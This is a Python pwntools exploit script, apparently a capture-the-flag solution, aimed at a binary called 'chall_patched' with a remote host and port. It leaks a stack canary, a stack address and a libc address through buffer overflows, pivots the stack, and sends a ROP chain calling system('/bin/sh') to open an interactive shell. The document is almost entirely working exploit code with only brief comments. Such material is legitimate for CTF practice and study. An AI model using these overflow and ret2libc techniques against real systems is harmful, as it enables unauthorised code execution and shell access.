#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = '103.160.212.3', 1470

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# func 1 ret
# breakrva 0x1368

# func 3 call
# breakrva 0x1433

# func 3 ret
breakrva 0x14e8

# func 2 ret
# breakrva 0x1431

c
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# RUNPATH:    b'.'
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No


def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'>', b'nan')

    # function 1
    io.sendafter(b'?', b'a'*25)
    io.recvuntil(b'a'*25)
    canary = u64(io.recv(7).rjust(8, b'\x00'))
    stack = u64(io.recv(6).rjust(8, b'\x00')) >> 16
    io.sendlineafter(b'?', b'a'*24+b'\x00')

    io.sendlineafter(b'>', b'1 1')
    io.sendlineafter(b'>', b'2.059908742557481e-43')

    # function 3
    pivot = stack + 0xd8 # back to _start
    payload = b'A'*24 + p64(canary) + p64(pivot)[:-2]
    io.sendafter(b'>', payload)
    for i in range(10):
        io.sendline(b'+')

    payload = b'\x00'*0x58 + p64(canary)
    io.sendafter(b'>', payload)

    # stage 2

    io.sendlineafter(b'>', b'nan')

    # function 1
    io.sendafter(b'?', b'a'*8)
    io.recvuntil(b'a'*8)
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x955d2
    io.sendlineafter(b'?', b'a')

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]

    io.sendlineafter(b'>', b'1 1')
    io.sendlineafter(b'>', b'2.059908742557481e-43')

    # function 3
    pivot = stack - 0xe8 + 0x28
    payload = b'A'*24 + p64(canary) + p64(pivot)[:-2]
    io.sendafter(b'>', payload)
    for i in range(10):
        io.sendline('+')

    io.sendlineafter(b'>', flat({
        56: [
            pop_rdi,
            next(libc.search(b'/bin/sh')),
            ret,
            libc.sym['system']
        ]
    }))

    log.info('libc: %#x', libc.address)
    log.info('canary: %#x', canary)
    log.info('stack: %#x', stack)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
